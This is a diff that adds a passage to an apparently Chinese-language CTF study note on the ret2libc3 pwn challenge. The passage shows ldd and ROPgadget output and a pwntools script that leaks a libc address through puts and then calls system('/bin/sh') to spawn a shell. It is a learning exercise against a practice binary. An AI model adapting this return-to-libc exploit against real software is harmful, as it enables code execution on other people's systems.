@@ -548,3 +548,59 @@ p.interactive()
 
 唔，他的wp貌似不能执行成功，这就很尴尬了。
 
+应该是泄露没成功吧。。
+
+由于现在是在本地跑的，libc.so应该也是本地的那种。
+
+首先我们通过ldd命令查看现在用的是哪个libc：
+
+```bash
+➜  pwn-study ldd ret2libc3
+	linux-gate.so.1 =>  (0xf7fd7000)
+	libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xf7dfc000)
+	/lib/ld-linux.so.2 (0xf7fd9000)
+```
+
+然后通过这个libc构造payload。
+
+```
+➜  pwn-study ROPgadget --binary ret2libc3 --only 'pop|ret' | grep 'ebx'
+0x080486fc : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
+0x0804841d : pop ebx ; ret
+```
+
+在使用本机libc和原来错误的wp的基础上，我勉勉强强搞出来一个还能跑的payload：
+
+```python
+from pwn import *
+from LibcSearcher import LibcSearcher as LC
+
+p = process('./ret2libc3')
+
+ret2libc3 = ELF('./ret2libc3')
+libc = ELF('./libc.so.6')
+puts_plt = ret2libc3.plt['puts']
+gets_plt = ret2libc3.plt['gets']
+main = ret2libc3.symbols['main']
+puts_got = ret2libc3.got['puts']
+buf2 = 0x0804A080
+pop_ebx = 0x0804841d
+payload = flat(
+    [
+        'a'*0x70,
+        puts_plt,
+        main,
+        puts_got,
+    ]
+)
+p.sendlineafter('Can you find it !?',payload)
+puts_got = u32(p.recvline()[0:4])
+base_addr = puts_got - libc.symbols['puts']
+sys_addr = base_addr + libc.symbols['system']
+binsh = base_addr + next(libc.search('/bin/sh'))
+payload = flat(['a'*104,sys_addr,0xdeadbeef,binsh])
+p.sendline(payload)
+p.interactive()
+```
+
+接下来就是没有libc的情况了，我要怎么办才能知道自己要的是哪个版本的libc呢？
